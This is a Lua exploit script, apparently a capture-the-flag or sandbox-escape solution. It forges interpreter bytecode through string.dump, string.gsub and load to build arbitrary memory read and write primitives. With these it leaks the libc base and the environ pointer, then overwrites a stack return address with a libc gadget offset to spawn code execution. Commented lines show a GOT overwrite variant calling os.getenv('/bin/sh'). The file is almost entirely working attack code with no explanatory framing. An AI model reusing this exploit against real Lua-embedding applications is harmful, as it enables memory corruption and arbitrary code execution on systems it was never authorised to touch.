local function _objAddr(o)
    local s = tostring(o)
    local addr = 0
    for i in string.gmatch(s, "0x(%x+)") do
        addr = tonumber(i, 16)
    end
    return addr
end

local function hex(a)
 local low = string.format("%x",a)
 local b = a//4294967296
 local high = string.format("%x",b)
 local out = high..low
 out = string.rep("0",16-string.len(out))..out
 return out
end

local function reverse(s)
 out = ""
 len = string.len(s)
 for i=len,1,-2 do
  tmp = string.sub(s,i-1,i)
  tmp = tonumber(tmp, 16)
  out = out .. string.char(tmp)
 end
 return out
end

local function reverse2(s)
 out = ""
 len = string.len(s)
 for i=len,1,-2 do
  tmp = string.sub(s,i-1,i)
  tmp = tonumber(tmp, 16)
  if (tmp == 0) then
      out = out .. "%z"
  else
    out = out .. string.char(tmp)
end
 end
 return out
end

local function p64(a)
    return reverse(hex(a))
end

local function paa(a)
    return reverse(hex(a))
end

local function p64_2(a)
    return reverse2(hex(a))
end

local function loadk(ra, k, t)
	local Bx = ((t-k)/16)*(2^6)
	local i = 1 + (ra*2^24) + Bx
    -- print (string.format("%08X, Bx=0x%X", i, Bx/(2^14)))
	return i
end

local function jmp(pc, t)
    local Bx = t - pc + 1048568
    local i = Bx * 8 + 20
    -- print (string.format("jmp: %08X", i))
    return i
end

local function repr(pc, t)
    local Bx = t - pc + 1048568
    local i = Bx * 8 + 30
    -- print (string.format("jmp: %08X", i))
    return i
end

local function settable(ra, k, key, value)
    local kb = (key - k) / 16 + 250
    local kc = (value - k) / 16 + 250
    print('kb', hex(kb))
    print('kc', hex(kc))
    return 9 + kc * 2 ^ 6 + kb * 2 ^ 15
end

-- foo:
--      repr -> buf+8 (str + 0x20)
-- str:
--      loadk (buf + 0x18) + jmp foo
--      4 + addr
local function b(addr)
    -- print("addr", hex(addr))
    collectgarbage()
    -- assert constant foo = 4
    -- assert instruct foo = 8 or 9
    local function foo()
        local a=1
        local b=2
        b = nil
        return string.len(a)
    end

    local _k={}
	local _str={}

	if (tostring(_k)>tostring(_str)) then
		local _t = _str
		_str = _k
		_k = _t
	end
    local _pc={}

    local _k_addr = _objAddr(tostring(_k))
    local _str_addr = _objAddr(tostring(_str))
    local _pc_addr = _objAddr(tostring(_pc))

    local p1 = string.rep("a", 8)
    local p2 = p64(loadk(0, _k_addr, _str_addr+48)) .. p64(jmp(_str_addr+48, _pc_addr+24))
    local p3 = p64(4) .. p64(addr-16)
    -- print("_k", tostring(_k), hex(_k_addr))
    -- print("_str", tostring(_str), hex(_str_addr))
    _str = nil
    _pc = nil
    collectgarbage()

    _str = p1 .. p2 .. p3 .. string.rep("a", 7)

    _pc = {}
    -- print('_pc', _pc, hex(_pc_addr))
    foo = string.dump(foo)
    foo = string.gsub(foo, p64_2(loadk(0, 0, 0)) ..  p64_2(loadk(1, 0, 16)),
                    paa(repr(_pc_addr+8, _str_addr+32)) ..
                    p64(loadk(1, 0, 16)))

    collectgarbage()

    _pc = nil
    _k = nil
    collectgarbage()
    foo = load(foo)
    return foo()
end

local function objAddr(o)
	local known_objects = {}
	known_objects['thread'] = 1; known_objects['function']=1; known_objects['userdata']=1; known_objects['table'] = 1;
	local tp = type(o)
	if (known_objects[tp]) then return _objAddr(o) end

	local f = function(a) coroutine.yield(a) end
	local t = coroutine.create(f)
    -- print('t', hex(_objAddr(t)))
	local top = b(_objAddr(t) + 16) --The field top is in offset 0x10
    -- print (t, string.format("top: 0x%08X", top))
	coroutine.resume(t, o)
	local addr = b(top+8)
    print ('addr:', string.format("0x%08X", addr))
	return addr
end

local function c(addr, value)
    local _k={}
	local _str={}

	if (tostring(_k)>tostring(_str)) then
		local _t = _str
		_str = _k
		_k = _t
	end

    local _k_addr = _objAddr(tostring(_k))

    local _table = string.rep("a", 24) .. p64(_k_addr+32) .. p64(addr-8) .. string.rep("b", 180)
    local _table_addr = objAddr(_table)


    local v1 = string.rep("a", 8) .. p64(5) .. p64(_table_addr+32)
    local _value = v1 .. string.rep("c", 10)
    local _value_addr = objAddr(_value)
    collectgarbage()
    -- assert constant foo = 4
    -- assert instruct foo = 8 or 9
    local function foo()
        local a=1
        local b=2261634.5098039214499294757843017578125
        b = nil
        return string.len(a)
    end

    local _pc={}

    local _str_addr = _objAddr(tostring(_str))
    local _pc_addr = _objAddr(tostring(_pc))

    print("k", hex(_k_addr))
    print("table", hex(_table_addr))
    print("value", hex(_value_addr))

    local p1 = string.rep("a", 8)
    local p2 = p64(loadk(0, _k_addr, _str_addr+48)) .. p64(settable(0, _k_addr, _k_addr, _k_addr+16))
    local p3 = p64(32795) .. p64(5) .. p64(_table_addr+32)

    _str = nil
    _pc = nil
    collectgarbage()

    _str = p2 .. p3 .. string.rep("a", 7)

    _pc = {}
    print('_pc', _pc, hex(_pc_addr))
    foo = string.dump(foo)
    foo = string.gsub(foo, p64_2(loadk(0, 0, 0)) ..  p64_2(loadk(1, 0, 16)),
                        p64(repr(_pc_addr+8, _str_addr+32-8)) .. p64(loadk(1, 0, 16)))
    foo = string.gsub(foo, string.rep("A", 8), p64(value))

    collectgarbage()

    _pc = nil
    _k = nil
    collectgarbage()
    foo = load(foo)
    return foo()
    --return
end

local buf = string.rep("a", 512)
local _buf_addr = objAddr(buf)

buf = nil
collectgarbage()

addr1 = b(_buf_addr)
libc_base = addr1 - 3952024

if (libc_base / 10 * 10 ~= libc_base) then
    print("Fuck")
end

print(hex(libc_base))
enviro = 3960632 + libc_base

ret = b(enviro) - 320
-- print(hex(ret))
c(ret+8, libc_base+983716)
-- c(ret+88, enviro+100)
c(ret+96, 0)
print(tostring(load))

os.getenv("zzz")
-- local libc_base = b(3735928559)
-- print(hex(libc_base))

-- local getenv_got = 6438944
-- local libc_base = b(getenv_got)
-- libc_base = libc_base-235376
-- libc_base = libc_base+283536
-- print(hex(libc_base))

-- c(getenv_got, libc_base)
-- os.getenv("/bin/sh")
-- io.read(1)
